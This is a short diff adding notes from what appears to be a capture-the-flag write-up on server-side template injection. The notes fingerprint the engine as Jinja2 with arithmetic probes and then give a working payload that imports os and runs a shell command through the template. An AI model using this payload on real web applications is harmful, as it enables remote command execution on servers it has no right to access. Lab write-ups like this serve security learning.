@@ -1,1 +1,4 @@
+The hint tells us that server side templating is used. A quick google search shows that some popular ones are Django, Jinja2, Mako, or Cheetah.
+I tried {{5*5}}, and got an Internal Server Error, By injecting {{5*'5'}} we can tell if its Jinja2 or Twig. Since it printed 55555 and not 25
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
 
